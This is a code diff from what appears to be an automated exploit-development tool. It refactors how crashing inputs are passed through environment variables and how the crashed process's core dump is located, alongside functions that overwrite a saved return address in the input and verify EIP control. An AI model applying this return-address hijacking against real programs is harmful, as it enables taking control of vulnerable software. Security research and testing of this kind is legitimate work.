@@ -2,7 +2,6 @@ from .utils import *
 from .dataclass_utils import Target
 from .exploit_utils import ENV_VARS
 
-
 def reproducer(target: Target) -> bool:
     """
     Validates that the input causes a memory corruption crash by reproducing that crash.
@@ -31,6 +30,17 @@ def reproducer(target: Target) -> bool:
 
     command = build_command(target)
 
+    target_env = {}
+    if target.target_input.type == 'env':
+        for key, value in target.env.items():
+            if value == '@@':
+                target_env[key] = crash_input
+            else:
+                target_env[key] = value
+    else:
+        target_env = target.env
+
+
     rep_proc = process(
         command, 
         shell=True,
@@ -38,7 +48,7 @@ def reproducer(target: Target) -> bool:
         stdout=PTY, 
         stderr=PTY, 
         raw=False, 
-        env={**target.env, **ENV_VARS}
+        env={**target_env, **ENV_VARS}
     )
 
     # rep_proc.send(b"\x04")
@@ -51,21 +61,26 @@ def reproducer(target: Target) -> bool:
 
     poll = rep_proc.poll()
     if poll == -11 or poll == 139:  #segfault
-        int_process = rep_proc.pid + 2
-        #+2 because the process with rep_proc.pid is the wrapper process interpreted by the shell from process(). The actual target repro process is a child of the external one
-        #100% a dumb way to do this, must change it
+
+        # The actual target repro process is a child of the external one
+        real_crash_pid = detect_real_crash(rep_proc.pid)
+
+        if real_crash_pid is None:
+            pivot_logger.error("No real crash process detected")
+            cleanup(1)
+
         # core_path = f'/core_dumps/core.{target.name}.{int_process}'
-        match = glob.glob(f'/core_dumps/core.*.{int_process}')
+        match = glob.glob(f'/core_dumps/core.*.{real_crash_pid}')
 
         if match and os.path.isfile(match[0]):
             return True
 
         else:
-            logging.error("Core dump is missing")
+            pivot_logger.error("Core dump is missing")
             cleanup(1)
 
     else:
-        logging.error("No memory corruption crash detected")
+        pivot_logger.error("No memory corruption crash detected")
         cleanup(1)
 
 
@@ -94,14 +109,24 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
 
     command = build_command(target)
 
+    target_env = {}
+    if target.target_input.type == 'env':
+        for key, value in target.env.items():
+            if value == '@@':
+                target_env[key] = crash_input
+            else:
+                target_env[key] = value
+    else:
+        target_env = target.env
+    
     crash_proc = process(
-        command, 
+        command,
         shell=True,
         stdin=PTY,
         stdout=PTY, 
         stderr=PTY,
         raw=False,
-        env={**target.env, **ENV_VARS}
+        env={**target_env, **ENV_VARS}
     )
 
     # crash_proc.send(b"\x04")
@@ -113,17 +138,21 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
 
     poll = crash_proc.poll()
     if poll != -11 and poll != 139:       # if not segfault
-        # logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
-        # return none when the input does not lead to a crash
+        # return none when the input does not lead to a crash, explorer backtracks
         return None
 
-    core_files = glob.glob(f'/core_dumps/core.*.*')
-    int_process = crash_proc.pid + 2
+    real_crash_pid = detect_real_crash(crash_proc.pid)
 
-    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)
+    if real_crash_pid is None:
+        pivot_logger.error("No real crash process detected")
+        cleanup(1)
+
+    core_files = glob.glob(f'/core_dumps/core.*.*')
+
+    core_path = next((f for f in core_files if f.endswith(f".{real_crash_pid}")), None)
 
     if core_path is None:
-        logging.error("In root cause analysis, previous crash did not generate a core dump")
+        pivot_logger.error("In root cause analysis, previous crash did not generate a core dump")
         cleanup(1)
 
     core = Corefile(core_path)
@@ -184,7 +213,7 @@ def overwrite_ra(crash_input: bytes, target_address: bytes) -> bytes:
     eip = core.eip.to_bytes(4, byteorder="little")
 
     if eip not in crash_input:
-        logging.error("we have a problem")
+        pivot_logger.error("we have a problem")
 
     payload = crash_input.replace(eip, target_address)
 
@@ -202,10 +231,6 @@ def target_ra() -> int:
 
     core_path = core_files[0]
     core = Corefile(core_path)
-
-    # print(f"Stack Base: {hex(core.stack.start)}")
-    # print(f"Stack Top: {hex(core.stack.stop)}")
-    # print(f"env vars addr: {hex(core.envp_address)}")
 
     # must check if top, base and env addresses are valid before using them
 
@@ -234,6 +259,16 @@ def verify_eip_control(target: Target):
 
     command = build_command(target)
 
+    target_env = {}
+    if target.target_input.type == 'env':
+        for key, value in target.env.items():
+            if value == '@@':
+                target_env[key] = crash_input
+            else:
+                target_env[key] = value
+    else:
+        target_env = target.env
+
     rep_proc = process(
         command, 
         shell=True,
@@ -241,9 +276,9 @@ def verify_eip_control(target: Target):
         stdout=PTY, 
         stderr=PTY, 
         raw=False, 
-        env={**target.env, **ENV_VARS}
+        env={**target_env, **ENV_VARS}
     )
-  
+
     # rep_proc.send(b"\x04")
     # rep_proc.stdin.close()
 
@@ -254,15 +289,20 @@ def verify_eip_control(target: Target):
     poll = rep_proc.poll()
     if poll != -11 and poll != 139:       # if not segfault
         pivot_logger.error('The crashing input failed to cause a crash.')
-        sys.exit(1)
+        cleanup(1)
 
-    int_process = rep_proc.pid + 2
+    real_crash_pid = detect_real_crash(rep_proc.pid)
+
+    if real_crash_pid is None:
+        pivot_logger.error("No real crash process detected")
+        cleanup(1)
+
     core_files = glob.glob(f'/core_dumps/core.*.*')
 
-    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)
+    core_path = next((f for f in core_files if f.endswith(f".{real_crash_pid}")), None)
 
     if core_path is None:
-        logging.error("Verifying eip control, crash did not generate a core dump")
+        pivot_logger.error("Verifying eip control, crash did not generate a core dump")
         cleanup(1)
 
     core = Corefile(core_path)
